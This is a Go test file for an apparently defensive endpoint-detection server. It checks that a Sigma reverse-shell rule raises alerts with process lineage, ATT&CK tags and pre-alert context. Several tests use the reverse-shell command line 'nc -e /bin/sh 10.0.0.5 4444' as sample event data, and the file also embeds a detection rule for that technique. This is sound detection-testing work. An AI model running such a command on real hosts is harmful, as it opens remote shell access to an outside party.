package control

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"context"

	"defendsec/internal/events"
	"defendsec/internal/forward"
	"defendsec/internal/presence"
	"defendsec/internal/sigma"
)

func detectionServer(t *testing.T, rules string) *Server {
	t.Helper()
	s := testServer()
	// recordAlert writes through the file store, so the test server needs a
	// real one rather than the bare struct the other tests use.
	s.store = presence.New(filepath.Join(t.TempDir(), "defendsec.json"))
	dir := t.TempDir()
	if err := writeFile(filepath.Join(dir, "rule.yml"), rules); err != nil {
		t.Fatal(err)
	}
	set, err := sigma.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	if set.Len() == 0 {
		t.Fatalf("no rules loaded: %+v", set.Skipped())
	}
	s.SetDetection(sigma.NewEngine(set))
	return s
}

func writeFile(path, body string) error {
	return osWriteFile(path, body)
}

const reverseShellRule = `
title: Reverse shell
id: 00000000-0000-0000-0000-000000000001
level: critical
description: A shell handed to a network tool.
falsepositives:
  - Deliberate administrative tooling
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|contains|all:
      - " -e "
      - /bin/sh
  condition: selection
`

// The whole pipeline: an event arrives, a rule fires, and the alert carries
// the process lineage that led to it. The lineage is the part a state-based
// tool cannot provide, because by the time it notices, the process is gone.
func TestDetectionAlertCarriesProcessLineage(t *testing.T) {
	s := detectionServer(t, reverseShellRule)
	now := time.Now().UTC()

	ancestry := []struct {
		pid, ppid int32
		image     string
		cmd       string
	}{
		{1, 1, "/sbin/init", "init"},
		{100, 1, "/usr/sbin/sshd", "sshd -D"},
		{200, 100, "/bin/bash", "-bash"},
	}
	batch := &defendsecEventBatch{Sensor: "proc-poll"}
	for _, a := range ancestry {
		ev := &events.Event{
			ID: "e" + a.image, DeviceID: "dev-1", Hostname: "host-1",
			Kind: events.KindProcess, At: now, PID: a.pid, PPID: a.ppid,
		}
		ev.Set(events.FieldImage, a.image)
		ev.Set(events.FieldCommandLine, a.cmd)
		ev.Set(events.FieldUser, "root")
		batch.Events = append(batch.Events, ev)
	}
	// The event that fires the rule.
	bad := &events.Event{
		ID: "e-bad", DeviceID: "dev-1", Hostname: "host-1",
		Kind: events.KindProcess, At: now, PID: 300, PPID: 200,
	}
	bad.Set(events.FieldImage, "/usr/bin/nc")
	bad.Set(events.FieldCommandLine, "nc -e /bin/sh 10.0.0.5 4444")
	bad.Set(events.FieldUser, "deploy")
	batch.Events = append(batch.Events, bad)

	s.HandleEventBatch("dev-1", "host-1", batch)

	alerts := s.store.ListAlerts("", "", "", 100)
	if len(alerts) != 1 {
		t.Fatalf("raised %d alerts, want 1", len(alerts))
	}
	alert := alerts[0]
	if alert.Kind != "detection" || alert.Severity != "critical" {
		t.Errorf("alert kind=%q severity=%q", alert.Kind, alert.Severity)
	}
	if alert.Title != "Reverse shell" {
		t.Errorf("title = %q", alert.Title)
	}

	text, _ := alert.Detail["process.ancestryText"].(string)
	if text == "" {
		t.Fatal("the alert carries no process lineage")
	}
	// Nearest first, walking back to init.
	for _, want := range []string{"/usr/bin/nc[300]", "/bin/bash[200]", "/usr/sbin/sshd[100]", "/sbin/init[1]"} {
		if !strings.Contains(text, want) {
			t.Errorf("lineage %q is missing %q", text, want)
		}
	}

	// ATT&CK technique travels with the alert, which is what makes the
	// coverage matrix meaningful. The detail map round-trips through JSON in
	// the store, so a []string comes back as []any — assert on the values
	// rather than the Go type.
	techniques := stringsOf(alert.Detail["attack.techniques"])
	if len(techniques) != 1 || techniques[0] != "T1059.004" {
		t.Errorf("techniques = %v", techniques)
	}
	// And the rule's false positives, so an analyst deciding whether this
	// matters does not have to go and find the rule file.
	if _, ok := alert.Detail["rule.falsePositives"]; !ok {
		t.Error("the alert does not carry the rule's false positives")
	}
}

// A dropped-event gap must be recorded and visible. A clean console during the
// incident that overwhelmed the pipeline is the worst possible outcome.
func TestEventGapsAreRecordedAndSurfaced(t *testing.T) {
	s := detectionServer(t, reverseShellRule)

	s.HandleEventBatch("dev-1", "host-1", &defendsecEventBatch{
		Sensor: "proc-poll", DroppedSinceLast: 512, DroppedTotal: 512,
	})

	gaps := s.EventGaps()
	gap, ok := gaps["dev-1"]
	if !ok {
		t.Fatal("no gap recorded")
	}
	if gap.DroppedTotal != 512 || gap.LastGap != 512 {
		t.Errorf("gap = %+v", gap)
	}
	if gap.LastGapAt.IsZero() {
		t.Error("the gap has no timestamp")
	}

	report := s.DetectionCoverageReport()
	joined := strings.Join(report.Caveats, " ")
	if !strings.Contains(joined, "dropped events") {
		t.Errorf("the coverage report does not surface the loss: %v", report.Caveats)
	}
}

// The rare and valuable half of a coverage map is what it says you cannot see.
func TestCoverageReportsBlindSpots(t *testing.T) {
	s := detectionServer(t, reverseShellRule)

	// Nothing observed yet: every kind is a blind spot, and the report has to
	// say so rather than showing technique coverage alone.
	report := s.DetectionCoverageReport()
	if len(report.UnobservedKinds) != len(events.Kinds()) {
		t.Errorf("unobserved = %v, want every kind", report.UnobservedKinds)
	}
	joined := strings.Join(report.Caveats, " ")
	if !strings.Contains(joined, "No agent has reported") {
		t.Errorf("caveats do not name the unobserved kinds: %v", report.Caveats)
	}
	// A technique with a rule is not a technique fully covered, and the
	// report must not imply otherwise.
	if !strings.Contains(joined, "not mean every way") {
		t.Errorf("caveats overstate technique coverage: %v", report.Caveats)
	}

	s.noteObservedKind(events.KindProcess)
	report = s.DetectionCoverageReport()
	if len(report.ObservedKinds) != 1 || report.ObservedKinds[0] != "process" {
		t.Errorf("observed = %v", report.ObservedKinds)
	}
	if len(report.Techniques) == 0 {
		t.Error("no techniques reported")
	}
}

// No rules loaded must say so loudly, not report an empty clean matrix.
func TestNoRulesIsStatedPlainly(t *testing.T) {
	s := testServer()
	report := s.DetectionCoverageReport()
	if report.Rules != 0 {
		t.Errorf("rules = %d", report.Rules)
	}
	if !strings.Contains(strings.Join(report.Caveats, " "), "no behavioural detection is running") {
		t.Errorf("caveats = %v", report.Caveats)
	}
}

func TestDetectionCoverageEndpoint(t *testing.T) {
	s := detectionServer(t, reverseShellRule)
	for token, want := range map[string]int{
		"admin-token":  http.StatusOK,
		"viewer-token": http.StatusOK,
		"bogus":        http.StatusUnauthorized,
	} {
		req := httptest.NewRequest(http.MethodGet, "/v1/detection/coverage", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		rec := httptest.NewRecorder()
		s.HandleDetectionCoverage(rec, req)
		if rec.Code != want {
			t.Errorf("token %q: status=%d, want %d", token, rec.Code, want)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/v1/detection/coverage", nil)
	req.Header.Set("Authorization", "Bearer admin-token")
	rec := httptest.NewRecorder()
	s.HandleDetectionCoverage(rec, req)
	var body DetectionCoverage
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}
	if body.Rules != 1 || len(body.Caveats) == 0 {
		t.Errorf("body = %+v", body)
	}
}

// Ordinary activity must not raise alerts, or the detection surface gets muted.
func TestBenignEventsRaiseNothing(t *testing.T) {
	s := detectionServer(t, reverseShellRule)
	ev := &events.Event{
		ID: "e", DeviceID: "dev-1", Kind: events.KindProcess,
		At: time.Now().UTC(), PID: 100, PPID: 1,
	}
	ev.Set(events.FieldImage, "/usr/bin/ls")
	ev.Set(events.FieldCommandLine, "ls -la")
	s.HandleEventBatch("dev-1", "host-1", &defendsecEventBatch{Events: []*events.Event{ev}})

	if len(s.store.ListAlerts("", "", "", 100)) != 0 {
		t.Error("an ordinary process raised an alert")
	}
}

// Trees are per device: one host's lineage must never explain another's alert.
func TestProcessTreesArePerDevice(t *testing.T) {
	s := detectionServer(t, reverseShellRule)
	a := s.treeFor("dev-a")
	b := s.treeFor("dev-b")
	if a == b {
		t.Fatal("two devices share a process tree")
	}
	if s.treeFor("dev-a") != a {
		t.Error("treeFor returned a different tree for the same device")
	}
}

// stringsOf renders a detail value that may have crossed JSON.
func stringsOf(v any) []string {
	switch typed := v.(type) {
	case []string:
		return typed
	case []any:
		out := make([]string, 0, len(typed))
		for _, item := range typed {
			out = append(out, fmt.Sprint(item))
		}
		return out
	default:
		return nil
	}
}

func osWriteFile(path, body string) error {
	return os.WriteFile(path, []byte(body), 0o600)
}

// Forwarding must never affect detection: a stalled collector cannot be
// allowed to slow rule matching or alerting.
func TestForwardingDoesNotAffectDetection(t *testing.T) {
	s := detectionServer(t, reverseShellRule)
	slow := &blockingDest{}
	f := forward.New(4, slow)
	defer f.Close()
	s.SetForwarder(f)

	ev := &events.Event{
		ID: "e", DeviceID: "dev-1", Hostname: "host-1",
		Kind: events.KindProcess, At: time.Now().UTC(), PID: 300, PPID: 1,
	}
	ev.Set(events.FieldImage, "/usr/bin/nc")
	ev.Set(events.FieldCommandLine, "nc -e /bin/sh 10.0.0.5 4444")

	start := time.Now()
	s.HandleEventBatch("dev-1", "host-1", &defendsecEventBatch{Events: []*events.Event{ev}})
	if elapsed := time.Since(start); elapsed > 2*time.Second {
		t.Fatalf("detection took %s behind a stalled forwarder", elapsed)
	}
	if len(s.store.ListAlerts("", "", "", 100)) != 1 {
		t.Error("the alert was not raised while forwarding was stalled")
	}
}

type blockingDest struct{}

func (blockingDest) Name() string { return "blocking" }
func (blockingDest) Send(ctx context.Context, _ []forward.Record) error {
	<-ctx.Done()
	return ctx.Err()
}
func (blockingDest) Close() error { return nil }

// An alert has to reach the operator's platform too: for many operators the
// collector is the system of record.
func TestAlertsAreForwarded(t *testing.T) {
	s := detectionServer(t, reverseShellRule)
	dest := &recordingDest{}
	f := forward.New(0, dest)
	defer f.Close()
	s.SetForwarder(f)

	ev := &events.Event{
		ID: "e", DeviceID: "dev-1", Hostname: "host-1",
		Kind: events.KindProcess, At: time.Now().UTC(), PID: 300, PPID: 1,
	}
	ev.Set(events.FieldImage, "/usr/bin/nc")
	ev.Set(events.FieldCommandLine, "nc -e /bin/sh 10.0.0.5 4444")
	s.HandleEventBatch("dev-1", "host-1", &defendsecEventBatch{Events: []*events.Event{ev}})

	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if dest.has("alert") && dest.has("event") {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("forwarded records = %v", dest.kinds())
}

type recordingDest struct {
	mu  sync.Mutex
	got []forward.Record
}

func (r *recordingDest) Name() string { return "recording" }
func (r *recordingDest) Send(_ context.Context, records []forward.Record) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.got = append(r.got, records...)
	return nil
}
func (r *recordingDest) Close() error { return nil }
func (r *recordingDest) has(kind string) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	for _, rec := range r.got {
		if rec.Kind == kind {
			return true
		}
	}
	return false
}
func (r *recordingDest) kinds() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	var out []string
	for _, rec := range r.got {
		out = append(out, rec.Kind)
	}
	return out
}

// The first question an analyst asks is what else the host was doing just
// before, which is why the short window exists at all.
func TestAlertCarriesPreAlertContext(t *testing.T) {
	s := detectionServer(t, reverseShellRule)
	base := time.Now().UTC().Add(-time.Minute)

	batch := &defendsecEventBatch{}
	for i, cmd := range []string{"whoami", "id", "uname -a"} {
		e := &events.Event{
			ID: fmt.Sprintf("ctx%d", i), DeviceID: "dev-1", Hostname: "host-1",
			Kind: events.KindProcess, At: base.Add(time.Duration(i) * time.Second),
			PID: int32(200 + i), PPID: 1,
		}
		e.Set(events.FieldImage, "/usr/bin/"+strings.Fields(cmd)[0])
		e.Set(events.FieldCommandLine, cmd)
		batch.Events = append(batch.Events, e)
	}
	bad := &events.Event{
		ID: "bad", DeviceID: "dev-1", Hostname: "host-1",
		Kind: events.KindProcess, At: base.Add(10 * time.Second), PID: 300, PPID: 1,
	}
	bad.Set(events.FieldImage, "/usr/bin/nc")
	bad.Set(events.FieldCommandLine, "nc -e /bin/sh 10.0.0.5 4444")
	batch.Events = append(batch.Events, bad)

	s.HandleEventBatch("dev-1", "host-1", batch)

	alerts := s.store.ListAlerts("", "", "", 100)
	if len(alerts) != 1 {
		t.Fatalf("alerts = %d", len(alerts))
	}
	raw, ok := alerts[0].Detail["event.context"]
	if !ok {
		t.Fatal("the alert carries no pre-alert context")
	}
	encoded, _ := json.Marshal(raw)
	for _, want := range []string{"whoami", "uname -a"} {
		if !strings.Contains(string(encoded), want) {
			t.Errorf("context is missing %q: %s", want, encoded)
		}
	}
}

// An unconfigured forwarder has to state the positioning rather than looking
// like a healthy one with nothing to do.
func TestForwardingEndpointStatesPositioning(t *testing.T) {
	s := testServer()
	req := httptest.NewRequest(http.MethodGet, "/v1/detection/forwarding", nil)
	req.Header.Set("Authorization", "Bearer admin-token")
	rec := httptest.NewRecorder()
	s.HandleForwarding(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "not a log store") {
		t.Errorf("body = %s", rec.Body.String())
	}

	// Destination addresses are part of the operator's infrastructure map.
	viewer := httptest.NewRequest(http.MethodGet, "/v1/detection/forwarding", nil)
	viewer.Header.Set("Authorization", "Bearer viewer-token")
	rec = httptest.NewRecorder()
	s.HandleForwarding(rec, viewer)
	if rec.Code != http.StatusUnauthorized {
		t.Errorf("a viewer read the forwarding destinations: %d", rec.Code)
	}
}
